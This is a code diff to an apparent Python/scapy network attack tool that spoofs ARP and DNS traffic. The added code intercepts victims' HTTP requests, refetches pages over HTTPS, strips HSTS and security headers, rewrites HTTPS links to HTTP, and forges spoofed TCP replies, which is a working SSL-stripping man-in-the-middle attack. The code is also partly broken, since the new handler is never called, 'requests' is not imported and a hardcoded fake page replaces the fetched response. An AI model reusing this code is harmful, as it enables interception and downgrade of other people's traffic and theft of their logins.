@@ -1,9 +1,7 @@
 from attacks.arp_spoof import ARPAttackSettings
 from dataclasses import dataclass
 from scapy.all import *
-from scapy.layers.http import *
 from util import Interface
-
 
 @dataclass
 class DNSEntry:
@@ -59,9 +57,6 @@ def handle_packet(settings: DNSAttackSettings, packet: Packet):
     spoof the DNS request in the packet.
     """
 
-    if HTTPRequest in packet:
-        return handle_http(settings.arp_settings, packet)
-
     # We only handle packets that have UDP, IP and DNS protocols
     # Packet must contain DNS query and IP layer
     if not (DNS in packet and IP in packet and UDP in packet):
@@ -107,4 +102,87 @@ def is_match(qname: str, type: str, dns_rule: DNSEntry):
         return qname.strip('.') == dns_rule.url.strip('.') and type.upper() == dns_rule.type.upper()
 
 def handle_http(settings: ARPAttackSettings, packet: Packet):
-    print(packet[HTTPRequest].self_build().decode())
+    method = None
+    host = None
+    path = None
+    
+    headers = { }
+
+    for header in packet[HTTPRequest].fields_desc:
+        name = header.real_name
+        property_name = header.name
+
+        if property_name == 'Unknown_Headers':
+            continue
+
+        value = packet.getfieldval(property_name)
+
+        if value == None:
+            continue
+
+        value = value.decode()
+
+        if name.lower() == 'host':
+            host = value
+        elif name.lower() == 'method':
+            method = value
+        elif name.lower() == 'path':
+            path = value
+        else:
+            headers[name] = value
+
+    if method.lower() == 'get':
+        response = requests.get(f'https://{host}{path}', headers=headers)
+
+        response_headers = response.headers
+        response_content = response.content.decode()
+
+        # we need to remove encoding headers as we already decoded the response
+        delete_headers = [
+            'content-length',
+            'content-encoding',
+            'transfer-encoding',
+            'strict-transport-security',
+            'content-security-policy']
+
+        for delete_header in delete_headers:
+            if delete_header in response_headers:
+                del response_headers[delete_header]
+
+        # replace all https occurences with http
+        response_content = response_content.replace('https', 'http')
+
+        http_response = create_http_response(200, response_headers, response_content)
+
+        send_http_response(http_response, packet, settings)
+
+def create_http_response(status, headers, content):
+    response = f'HTTP/1.1 {status}\r\n'
+
+    for header, value in headers.items():
+        response += f'{header}: {value}\r\n'
+
+    response += f'Content-Length: {len(content) + 2}'
+
+    response += '\r\n'
+    response += content
+    response += '\r\n\r\n'
+
+    return response
+
+def send_http_response(response: str, packet: Packet, settings: ARPAttackSettings):
+    # response_packets = IP() / TCP() / http_response
+    fake_response = 'HTTP/1.1 200 OK\x0d\x0aServer: Testserver\x0d\x0aConnection: Keep-Alive\x0d\x0aContent-Type: text/html; charset=UTF-8\x0d\x0aContent-Length: 291\x0d\x0a\x0d\x0a<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.0//EN\"><html><head><title>Server</title></head><body bgcolor=\"black\" text=\"white\" link=\"blue\" vlink=\"purple\" alink=\"red\"><p><font face=\"Courier\" color=\"blue\">-Server is running' +  ('!' * 1400)  + '</font></p></body></html>'
+
+    response_packets = IP() / TCP() / HTTP(bytes(fake_response, 'utf-8'))
+    response_packets[IP].src = packet[IP].dst
+    response_packets[IP].dst = packet[IP].src
+    response_packets[TCP].sport = packet[TCP].dport
+    response_packets[TCP].dport = packet[TCP].sport
+    response_packets[TCP].seq = packet[TCP].ack
+    response_packets[TCP].ack = packet[TCP].seq
+
+    response_packets.show()
+
+    print('sending reply')
+    sendp(response_packets, iface=settings.interface.name)
